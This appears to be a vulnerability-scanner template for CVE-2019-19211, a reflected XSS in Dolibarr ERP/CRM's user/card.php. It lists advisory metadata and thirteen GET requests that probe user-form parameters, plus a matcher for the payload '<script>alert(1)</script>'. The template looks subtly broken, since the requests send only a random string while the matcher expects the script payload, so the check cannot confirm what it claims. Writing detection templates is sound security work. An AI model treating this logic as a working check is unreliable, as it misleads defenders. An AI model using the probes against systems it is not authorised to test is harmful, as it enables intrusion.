id: CVE-2019-19211

info:
  name: Dolibarr ERP/CRM Reflected XSS
  author: ProjectDiscoveryAI
  severity: medium
  description: Dolibarr ERP/CRM before 10.0.3 has an Insufficient Filtering issue that can lead to user/card.php XSS.
  impact: |
    Successful exploitation could lead to unauthorized access to sensitive information.
  remediation: |
    Apply the vendor-supplied patch or upgrade to a non-vulnerable version.
  reference:
    - https://herolab.usd.de/en/security-advisories/usd-2019-0053/
    - https://herolab.usd.de/en/security-advisories/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2019-19211
    cwe-id: CWE-79
    epss-score: 0.00102
    epss-percentile: 0.43125
    cpe: cpe:2.3:a:dolibarr:dolibarr:*:*:*:*:*:*:*:*
  metadata:
    vendor: dolibarr
    product: dolibarr
  tags: intrusive

http:
  - method: GET
    path:
      - "{{BaseURL}}/dolibarr/htdocs/user/card.php?id=2&action=create&signature={{randstr}}"
      - "{{BaseURL}}/dolibarr/htdocs/user/card.php?id=2&action=create&lastname={{randstr}}"
      - "{{BaseURL}}/dolibarr/htdocs/user/card.php?id=2&action=create&firstname={{randstr}}"
      - "{{BaseURL}}/dolibarr/htdocs/user/card.php?id=2&action=create&office_phone={{randstr}}"
      - "{{BaseURL}}/dolibarr/htdocs/user/card.php?id=2&action=create&user_mobile={{randstr}}"
      - "{{BaseURL}}/dolibarr/htdocs/user/card.php?id=2&action=create&office_fax={{randstr}}"
      - "{{BaseURL}}/dolibarr/htdocs/user/card.php?id=2&action=create&email={{randstr}}"
      - "{{BaseURL}}/dolibarr/htdocs/user/card.php?id=2&action=create&job={{randstr}}"
      - "{{BaseURL}}/dolibarr/htdocs/user/card.php?id=2&action=create&weeklyhours={{randstr}}"
      - "{{BaseURL}}/dolibarr/htdocs/user/card.php?id=2&action=create&accountancy_code={{randstr}}"
      - "{{BaseURL}}/dolibarr/htdocs/user/card.php?id=2&action=create&thm={{randstr}}"
      - "{{BaseURL}}/dolibarr/htdocs/user/card.php?id=2&action=create&tjm={{randstr}}"
      - "{{BaseURL}}/dolibarr/htdocs/user/card.php?id=2&action=create&salary={{randstr}}"

    matchers:
      - type: word
        words:
          - "<script>alert(1)</script>"
        part: body
